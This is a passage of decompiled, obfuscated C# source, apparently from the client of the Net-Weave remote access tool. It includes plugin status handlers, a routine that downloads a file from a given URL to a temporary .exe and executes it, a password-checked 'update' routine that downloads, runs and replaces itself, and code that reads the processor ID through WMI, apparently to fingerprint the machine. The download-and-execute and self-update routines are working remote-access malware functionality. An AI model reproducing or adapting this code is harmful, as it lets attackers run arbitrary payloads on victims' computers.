	private static void smethod_11(object sender, EventArgs0 e)
	{
	}

	private static void smethod_12(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class9).method_9(((IPlugin)((sender is IPlugin) ? sender : null)).get_Name() + ": Stopped");
			}
		}
		catch
		{
		}
	}

	private static void smethod_13(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class9).method_9(val.get_Name() + ": Started");
			}
		}
		catch
		{
		}
	}

	private static void smethod_14(IPlugin iplugin_0, PluginArgs pluginArgs_0)
	{
		try
		{
			pluginArgs_0.PluginGuid = iplugin_0.get_Guid();
			if (iplugin_0.get_StateObject() != null)
			{
				Class9 @class = iplugin_0.get_StateObject() as Class9;
				@class.method_7(new Class8(Class9.Enum2.const_12, Serializer.Serialize(pluginArgs_0)).method_0());
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("PLUGIN ERROR - Name: {0}, Error: {1}", iplugin_0.get_Name(), ex.Message);
			(iplugin_0.get_StateObject() as Class9).method_9(iplugin_0.get_Name() + ": Error");
		}
	}

	private static void smethod_15(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class9).method_9(val.get_Name() + ": Executed");
			}
		}
		catch
		{
		}
	}

	private static void smethod_16(object object_0)
	{
		object[] array = (object[])object_0;
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[1] as Class9).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			Process.Start(fileName);
			webClient.Dispose();
			(array[1] as Class9).method_9("File Executed");
		}
		catch
		{
			(array[1] as Class9).method_9("Error Downloading File.");
		}
	}

	private static void smethod_17(object object_0)
	{
		object[] array = (object[])object_0;
		if (array[1].ToString() != Encoding.Default.GetString(Class10.smethod_1(Convert.FromBase64String(Class5.string_10), bool_0: false)))
		{
			(array[2] as Class9).method_9("Invalid password");
			return;
		}
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[2] as Class9).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			(array[2] as Class9).method_9("Updating");
			if (Class5.bool_0)
			{
				Class7.smethod_4();
			}
			(array[2] as Class9).method_10(bool_2: false);
			Process.Start(fileName);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			(array[2] as Class9).method_9("Error Updating");
		}
	}

	private static void smethod_18()
	{
		new Thread(smethod_19).Start();
	}

	private static void smethod_19()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("A Net-Weave client is running on this PC.\nPress OK to close the client.", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	private static string smethod_20()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text == "")
					{
						text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
							.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string smethod_21(string string_1)
	{
		MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}
}
